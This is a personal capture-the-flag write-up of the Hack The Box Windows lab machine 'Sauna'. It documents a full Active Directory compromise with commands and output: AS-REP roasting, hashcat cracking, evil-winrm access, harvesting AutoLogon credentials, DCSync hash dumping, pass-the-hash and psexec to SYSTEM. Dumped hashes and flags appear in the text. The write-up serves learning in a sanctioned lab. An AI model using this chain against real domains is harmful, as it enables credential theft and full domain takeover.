# Sauna HTB writeup

![](../../../.gitbook/assets/f31d5d0264fadc267e7f38a9d7729d14.webp)

Sauna was my very first windows box, so don't expect this writeup to be super technical or with a lot of knowledge of what's going. Even though, the box was easy to do.

## Recon

First nmap scan showed the box was an AD with kerberos and a web site running on port 80.

```bash
# Port scan
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-27 18:03 CEST
Nmap scan report for 10.10.10.175
Host is up (0.068s latency).
Not shown: 65515 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49686/tcp open  unknown
64808/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 184.21 seconds
           Raw packets sent: 196698 (8.655MB) | Rcvd: 2100 (479.390KB)



# Script results
[*] Running NMAP scripts to open ports
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-27 18:06 CEST
Nmap scan report for 10.10.10.175
Host is up (0.32s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-28 00:07:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
64808/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/27%Time=5EF76E89%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m45s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-06-28T00:09:39
|_  start_date: N/A
```

## FSmith user

Browsing the web site I've found a list of possible usernames at [http://10.10.10.175/about.html](http://10.10.10.175/about.html)

Then did a wordlist of possible usernames.

```bash
$ cat usernames.txt
sauna
HSmith
SKerb
HBear
BTaylor
SDriver
SCoins
FSmith
```

Next step is to try get TGTs from users who have 'Do not require Kerberos preauthentication' set on kerberos

```bash
$ python3 /home/xnaaro/git_repos/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile usernames.txt  -format hashcat -o passwords.txt
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] User sauna doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HSmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

This gave me an `Kerberos 5 AS-REP` hash from FSmith user.

```bash
$ cat passwords.txt
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:3206b8cb1b99b24d5ddeb489e7159ccf$43b733ba230f2f9a2de8663588d5d335a8928ec26a0d6c061aadb80821b4e322317d7687b0f90bbb8c9c080c0ed9daca9df11bacc6e7db2eb4df5f742194c19a65792edeb948e899fab681fff296d296ab65366cc0cb93c4ab84f058c1--------------------------------------------------------------------------
```

Cracked the password with hashcat

```bash
$ hashcat -m 18200 passwords.txt --wordlist /usr/share/wordlists/rockyou.txt --force -o cracked_pass
hashcat (v5.1.0) starting...


Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:bd3af59...b5f83a
Time.Started.....: Mon Jun 29 18:12:54 2020 (32 secs)
Time.Estimated...: Mon Jun 29 18:13:26 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   331.2 kH/s (12.07ms) @ Accel:8 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10530816/14344385 (73.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tr1nity -> Teague51

Started: Mon Jun 29 18:12:54 2020
Stopped: Mon Jun 29 18:13:27 2020


$ cat cracked_pass
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:bd3af5934e1a9abfc6cd770402233512$6edde74195ce2e808f1fa664e97ebab69a672a6b12ab0a580906d2c357cc98f986fa71aba2fe85c9ce139b297d234824f82b374f473585a////////////////////////////////:The----------3
```

As winrm was enabled on the server I could easily connect using `evil-winrm` using FSmith and just cracked credentials.

```bash
$ evil-winrm -i 10.10.10.175 -u FSmith -p The-----------3

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:03 AM             34 user.txt


*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
1b5520b98d---------------------
```

First thing I did was to run `winPEAS.exe` which gave me default credentials for `svc_loanmgr` user

```bash
  [+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Mo-----------------d!
```

With this user now I can dump secrets with impacket.

```bash
$ impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863-----------------------dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:bc8d511e5aba1a9a0dc08dd65886267b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:85aa062ea68e989d52ea603faf0819ef94ab9749ac16385560f7d85a23a1b99a
SAUNA$:aes128-cts-hmac-sha1-96:7c6cc42b0a42c1c1d3e71d4524a265f2
SAUNA$:des-cbc-md5:f438fd4f61136be5
[*] Cleaning up...
```

I've first had some errors about time not synced with the server, so first updated my local type with the box date.

```bash
$ sudo ntpdate 10.10.10.175
30 Jun 04:51:08 ntpdate[19204]: step time server 10.10.10.175 offset +25203.209026 sec
```

Now got a ticket from kerberos as Adminstrator user using his NTLM hash

```bash
$ python3 getTGT.py EGOTISTICAL-BANK.LOCAL/Administrator -hashes :d9485863-------------------ff
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Saving ticket in Administrator.ccache
```

Set an environment variable with ticket file.

```bash
export KRB5CCNAME=/home/xnaaro/git_repos/impacket/examples/Administrator.ccache
```

Now added sauna to etc/hosts and exec into the box

```bash
$ python3 psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@sauna.EGOTISTICAL-BANK.LOCAL -k -no-pass
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on sauna.EGOTISTICAL-BANK.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file IIMFVtLs.exe
[*] Opening SVCManager on sauna.EGOTISTICAL-BANK.LOCAL.....
[*] Creating service QMyO on sauna.EGOTISTICAL-BANK.LOCAL.....
[*] Starting service QMyO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.
```

I have system rooted at this point.

```bash
C:\Users\Administrator\Desktop>whoami
nt authority\system

C:\Users\Administrator\Desktop>hostname
SAUNA
C:\Users\Administrator\Desktop>type root.txt
f3ee04965c68257382e31502cc5e881f
```

This was my first windows box, I was a bit lost and not fully understand yet all the steps I did, need to learn more about how kerberos works.

Regards

